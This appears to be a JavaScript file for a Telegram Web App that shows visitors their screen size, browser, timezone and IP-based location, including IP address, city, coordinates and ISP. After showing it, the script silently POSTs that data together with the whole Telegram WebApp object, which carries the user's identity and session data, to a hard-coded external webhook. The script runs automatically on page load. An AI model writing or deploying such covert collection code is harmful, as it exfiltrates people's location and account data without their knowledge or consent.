/*inf.js*/
async function infData() {
  let it = "<h1>Доступная информация</h1>";
  it = it+"<h2>Экран вашего устройства</h2>";
  let scrWid = window.screen.width;
  let scrHei = window.screen.height;
  let orient = (scrWid > scrHei)?'Горизонтальная':'Вертикальная';
  it = it+"<p>Ширина: "+scrWid+" px</p>";
  it = it+"<p>Высота: "+scrHei+" px</p>";
  it = it+"<p>Ориентация: "+orient+"</p>";
  let brows = navigator.userAgent;
  it = it+"<h2>Браузер</h2>";
  it = it+"<p>"+brows+"</p>";
  let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  it = it+"<p>Часовой пояс: "+timezone+"</p>";
  let offset = new Date().getTimezoneOffset();
  let offsetHours = -(offset / 60);
  let utcTime = (offsetHours >= 0 ? "+" : "") + offsetHours;
  it = it+"<p>UTC: "+utcTime+"</p>";
  it = it+"<h2>Локация</h2>";
  let lc = (typeof window.Telegram.WebApp.themeParams.link_color=='undefined')?'#0000FF':window.Telegram.WebApp.themeParams.link_color;
  //https://ipapi.co/json/
  //https://api.ipify.org?format=json
  //https://ip-api.com/
  it = await fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(d => 
      document.getElementById("inf").innerHTML = it
      +"<p>Страна: "+d.country_name+" ("+d.country_code+")</p>"
      +"<p>• Валюта: "+d.currency_name+" ("+d.currency+")</p>"
      +"<p>• Площадь: "+d.country_area+" км²</p>"
      +"<p>• Население: "+d.country_population+" чел.</p>"
      +"<p>Регион: "+d.region+"</p>"
      +"<p>Населенный пункт: "+d.city+"</p>"
      +"<p>Google карта: <a style='color:"+lc+";' href='https://www.google.ru/maps/search/?api=1&map_action=map&zoom=15&query="+d.latitude+","+d.longitude+"'>"+d.latitude+","+d.longitude+"</a></p>"
      +"<p>Провайдер: "+d.org+"</p>"
      +"<p>IP адрес: "+d.ip+"</p>"
      );
  document.getElementById("inf").innerHTML = it;
  let regex = /<p>|<\/p>/g;
  let ib = it.replaceAll(regex, '');
  regex = /<h1>|<h2>/g;
  ib = ib.replaceAll(regex, '<b>');
  regex = /<\/h1>|<\/h2>/g;
  ib = ib.replaceAll(regex, '<\/b>');
  let ipData = ib;
  let url = 'https://qnext.app/bin/webhooks/8588/620/qCNJIFQn4QupnhVr';
  let tg = window.Telegram.WebApp;
  let data = {twa: tg, info: ipData};
  let whr = await fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
  return;
}
infData();
//END
